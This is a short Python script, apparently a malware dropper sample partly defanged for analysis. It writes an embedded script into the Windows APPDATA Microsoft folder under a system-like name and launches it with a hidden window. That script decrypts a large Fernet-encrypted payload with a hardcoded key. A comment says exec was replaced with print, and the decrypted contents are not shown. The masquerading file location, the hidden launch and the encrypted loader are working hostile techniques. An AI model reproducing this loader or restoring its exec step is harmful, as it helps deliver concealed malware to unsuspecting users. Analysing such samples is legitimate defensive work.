import os
import subprocess

script = """
from fernet import Fernet
import os

# I REPLACED EXEC WITH PRINT
print(Fernet(b'ocuQXIbJfEWtV8nf7MccHcnFVqT0NzhpK6bBOmmPD68=').decrypt(b'gAAAAABmdbJ2mZ6A1hL6kfHMTO9jOQFHnkBCnwYMNUJRpdTe9LaNihMGPX8FCOMzidgbTHBRia-_HnaABUOLu6OxywgQPihXrJtGpp89Qy0b7j3ehWJVoC8OzATuf7pupLCUWz0SI9CLrI4r7OBkqrU6gP6FvHrGVk_AUBGsYqolV72FiUlFDw3n7kxAHOTNbEyNjllKo31pRPsf77HNvft_p1lOrowudk4k7y31zlCYJ5IdHZrk1aYqng9RO0qkn0LnOTDoHhY6OczVyjCo2FPZFlUKNVZHX5Jyt5bEOYaq3WwG_iG4g9uhUKdWsZJDvObr04j5tzwKqqEUoksZJl75zbxcgSb2w5vHybJ4rE6V8S_9W0oZ8q-uv7hb3d3OEjsk1sLhk0ZyEeVDn0I8J7yEqJTDWzWcoZY1t6bkSw7nvz73E_lzCLrK9t5SabswqedQeUsp2XecyjOIArPz5EPKged93BmqRt8YpBYsZso2b-RZ7rrVFshUOkFZkDUhEcdJgRzL5s3ky9e9tmk7VRj1OI7SxmrVywwmhkS4H9KLHx0O0i8J0-CaYXi5awNI9VbJTYBQm9f9nJt8YA5brMtb0ynTwawHIu2Puo2ubGdVgVVQ9ZmUlTXNeHgngh4MGBV_bnxQz_NbdUjTEIx0wiVQtdq26aFoPtBCepK5j69VUYV2jRnxb4TZdi041qkn443NmoSFIOazzlEDquNAAbQZ0FT2BMatOPHEWaqNSwkolpnJPRZbfuAwOthSkPelyY9dAA3XTym2g45pBPK8FhCDGqdDL4qYsz7B27j5PQF4KEY2do3n1WmDJndi6vUgIQ7IzRgZxwCCbWiV5O4ACaZL_KwjcffmJNGTmmd-zcmgUrH7hlMI9EAJNxoBb58NclsBh78qo81e-QhMHQCRZvvBEYSrXmW0NIDrh6MN6ezYIXseiHDSpLMGzxOIcUeXDaTUESzn7MgOtwaHt7OzNOfYZn2HXdupVbdaMt_Fy-LqETvsuGJJ1t8QyozvNvwIfTn3tA45IX0BkybbZ4vx6F-5W0b_1Vswg2qwl0kXjVFU7d0MpmjFGbZG7uWFBXSMi8waCUu54_lyx81THHejYkml9mpr4hVaDdtc1D0f3aSUSeMw9sE4cA5G5ZG0KvnOjbR4n8xsW07Tpn0z6p9Viu95DrqVPV2sVTscGHYyBl0vl8QCGkaViAejUgDZeUQB5v6gvCGqL3xqvWJ4sdUI2I1U663cUwJazZAnGGMLuKAIg28x5ij7NZR09-o0dosuarA4yp1_Nv5voyTK0b5vFoesCbH1fosT1ffEBPVxVIl4aod0lAXjn53_B9xRkvziYCd15WFSfVPLt99qwoQ1mc8QtohnmqdkqMTilEn4LJreAaF62rFXvLgTJAomY-8ej3CwWBC00XNX7cizmD5VjhE6F5dwOOt1DKB3ktXsKSLqotbaNiY-Ga33U4jmNU8-T7efAppLMhVN92gRCrJZu_eMfzFsAMI30_o9TuYLTX4u6d8CsZgrHh7PI3kW2WktWEKbBrBArTLicGCerJPjRLUz_kxJmyRjlBetKVIp0Kbl-7O4hRaFxrI2_i9ALBBATyOVGqMD1we0drHOttdyQd5OT0oyalxHmCWw6oCSVJ2X352r36BMZC3QbjtyQ6OPsgcU6806rPQ_dIweVKc9-pEt31p77josl1cqfn6g2dwP9AnfN7h4569cdpHeW8kvA9L_HnZE_BM-WG-tDU9PC-hvOKBJ8YclCABXiOqYWL39mCNgzN20e6R5PihTnCiDk6OW1RX7nvDirJ7nUjhu3FGh3he-0KLE6J-vOCP_ox5CbLu79DV0ThlFCu9x3L9qrTXrvPsalzIJXlf_K0fazB5Dgq7hRqJ1kgjsHiH0eB3cIZzJIRx7ICTEpAg4FFzhRwuO3_Ejy0ZS5DtSHc1tNzje0lOHvB99_mc6YTGQDcMNcbMAXfj2K1Fwvafaqh6r5EIXTR4PJ2Ec_Mu93LwcieU4-mJRXf3jTBudeP1tpPltZENvxWlM8M0-2fz5S3oD-gBk2BkOua-ddRMu4QBmLU1WGxmjqjLKKV1gpEK8kfWtETmj_ADu6QxPGcMWsoS-77spdwJzMrYiZUzgQvGgC4t0TVH22h2iApEvGIXiBNAJ3vvEgtiGEatGEq776VLNnw9oSpbgdg2ldUrsFGxv2oJ0l6H7rZEBKbVPJ8wtTLkQT6_9G7e5VYB5_r4w4sbVndCwvW4CmVhP_RtO6Czi2knGOCTdf8ArZPUG4UMqpsrmG3t3zNUx7rxkZTcbQ4xOhXYgUVnIuA5ksoejJ7IYaK_XUvowfdhlKvlUUtHMOclW2WZcqq21GIOGgyctNz-mRhagE33QQAENG3Gs8hjt4OFgmt1X0KLTcZO-u1419aVzKYGBJaWTOpmyJwgMvUyijJtpWmRS-KWwKjgR5ZaqFnTNsvtuKQ80NzvAw6mVNI4yEbCWcPVQM4t2Ov2OcsBnjawDX_kEgoumk-pAd4-xjB7ERFZtQxSY6LUoxuALuF0kUfUKwvM_RtMlA23gkPB9_MU6aUxFHrZA9K_fP8bQnM5w3cjI5NJfZM7AkWzVk4_fKM05USOpEFDe0pBuKiznplyesMWQPJ6qEyOH0qXGbYmOuDJx3q3iA9PMTQcZD8ugj7h03b2E_23OP0Y_3R-sVoN8UN1unTz6gj2sb42NqVNKLCKk4dDqgY3wqpbhzvaCK9buZMf6aZlZRqLKAm8oxBh4o8H4hfjJkHeYXgLMwqD0N8wm7i_2EcB2LA4kUmbvka5DU_gi0Dy4Hlifhrxh5oyt5SLdXarc7IVzJXKl9U9QAf_60e84NpRalIl2P-rUqfQIjh05g15GmH5QhHOE6FeFnW469GOfAjeqD-Cp2_6vgBX2OrbQQoGmY8hRgnnUD9TiTGJKHLc=').decode())
"""

appdata = os.environ.get('APPDATA', '')
if appdata:
    # create microsoft folder if it doesn't exist
    microsoft_folder = os.path.join(appdata, 'Microsoft')
    if not os.path.exists(microsoft_folder):
        os.mkdir(microsoft_folder)
    script_path = os.path.join(appdata, 'Microsoft', 'runpython.py')
    with open(script_path, 'w') as script_file:
        script_file.write(script)
subprocess.Popen(['python', script_path], creationflags=subprocess.CREATE_NO_WINDOW)
